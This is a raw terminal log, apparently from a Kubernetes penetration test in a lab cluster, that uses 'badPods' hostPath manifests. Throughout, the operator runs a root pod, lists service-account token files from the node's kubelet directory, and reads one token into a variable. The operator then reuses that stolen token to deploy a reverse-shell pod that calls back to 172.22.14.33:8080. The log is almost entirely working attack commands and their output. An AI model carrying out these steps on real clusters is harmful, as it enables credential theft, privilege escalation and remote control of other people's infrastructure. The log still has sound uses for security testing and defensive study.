ubuntu@test-master:~/reverse-shell/badPods/manifests/hostpath/deployment$ kubectl create -f hostpath-exec-deployment.yaml  -n default
deployment.apps/hostpath-exec-deployment created
ubuntu@test-master:~/reverse-shell/badPods/manifests/hostpath/deployment$ kubectl scale deployment -n default hostpath-exec-deployment --replicas=4
deployment.apps/hostpath-exec-deployment scaled
ubuntu@test-master:~/reverse-shell/badPods/manifests/hostpath/deployment$ kubectl get pods -n default -o wide
NAME                                       READY   STATUS    RESTARTS   AGE   IP               NODE            NOMINATED NODE   READINESS GATES
hostpath-exec-deployment-5b84d5d66-4rfjg   1/1     Running   0          9s    192.168.98.25    test-worker-4   <none>           <none>
hostpath-exec-deployment-5b84d5d66-52pf7   1/1     Running   0          32s   192.168.101.75   test-master2    <none>           <none>
hostpath-exec-deployment-5b84d5d66-tgmsq   1/1     Running   0          9s    192.168.33.51    test-worker-1   <none>           <none>
hostpath-exec-deployment-5b84d5d66-whdrt   1/1     Running   0          32s   192.168.68.40    test-worker-2   <none>           <none>
ubuntu@test-master:~/reverse-shell/badPods/manifests/hostpath/deployment$ cd ../pod/
ubuntu@test-master:~/reverse-shell/badPods/manifests/hostpath/pod$ kubectl cp hostpath-revshell-pod.yaml -n default hostpath-exec-deployment-5b84d5d66-52pf7:/
ubuntu@test-master:~/reverse-shell/badPods/manifests/hostpath/pod$ kubectl cp ../../../scripts/can-they.sh -n default hostpath-exec-deployment-5b84d5d66-52pf7:/
ubuntu@test-master:~/reverse-shell/badPods/manifests/hostpath/pod$ kubectl exec -it -n default hostpath-exec-deployment-5b84d5d66-52pf7 -- bash
root@hostpath-exec-deployment-5b84d5d66-52pf7:/# chmod 755 can-they.sh
root@hostpath-exec-deployment-5b84d5d66-52pf7:/# ./can-they.sh | grep pods
Token Location: /host/var/lib/kubelet/pods/e5f4d46c-6bf6-40ac-9dcb-e96a3e62d91e/volumes/kubernetes.io~projected/kube-api-access-m6m9z/token
Token Location: /host/var/lib/kubelet/pods/0d103c48-b5a4-43ab-84ae-e46e1ca0dc4b/volumes/kubernetes.io~projected/kube-api-access-jfvnr/token
pods                                            []                                     []               [get list watch]
pods/status                                     []                                     []               [patch]
Token Location: /host/var/lib/kubelet/pods/2f091e72-307f-49bc-a08b-9b220ea24af3/volumes/kubernetes.io~projected/kube-api-access-rr5jl/token
Token Location: /host/var/lib/kubelet/pods/48efba01-240e-4c4c-9400-ffe447926658/volumes/kubernetes.io~projected/kube-api-access-jghxw/token
Token Location: /host/var/lib/kubelet/pods/263beb85-ad76-45f9-a7e5-a00cf155e219/volumes/kubernetes.io~projected/kube-api-access-m64d7/token
pods                                                           []                                     []               [*]
Token Location: /host/var/lib/kubelet/pods/958e51f0-89bf-4900-ace7-0458723976a9/volumes/kubernetes.io~projected/kube-api-access-brpdn/token
Token Location: /host/var/lib/kubelet/pods/84ca633b-a050-4671-834a-21485a762923/volumes/kubernetes.io~projected/kube-api-access-xrx55/token
Token Location: /host/var/lib/kubelet/pods/05beb61c-7c35-4219-a03e-610af2f429e7/volumes/kubernetes.io~projected/kube-api-access-dr8kj/token
root@hostpath-exec-deployment-5b84d5d66-52pf7:/# export cred=`cat /host/var/lib/kubelet/pods/263beb85-ad76-45f9-a7e5-a00cf155e219/volumes/kubernetes.io~projected/kube-api-access-m64d7/token`
root@hostpath-exec-deployment-5b84d5d66-52pf7:/# kubectl get pods --token=$cred
NAME                                       READY   STATUS    RESTARTS   AGE
hostpath-exec-deployment-5b84d5d66-4rfjg   1/1     Running   0          3m33s
hostpath-exec-deployment-5b84d5d66-52pf7   1/1     Running   0          3m56s
hostpath-exec-deployment-5b84d5d66-tgmsq   1/1     Running   0          3m33s
hostpath-exec-deployment-5b84d5d66-whdrt   1/1     Running   0          3m56s
root@hostpath-exec-deployment-5b84d5d66-52pf7:/# HOST="172.22.14.33" PORT="8080" envsubst < ./hostpath-revshell-pod.yaml | kubectl apply -n default --token=$cred -f -
pod/hostpath-revshell-pod created

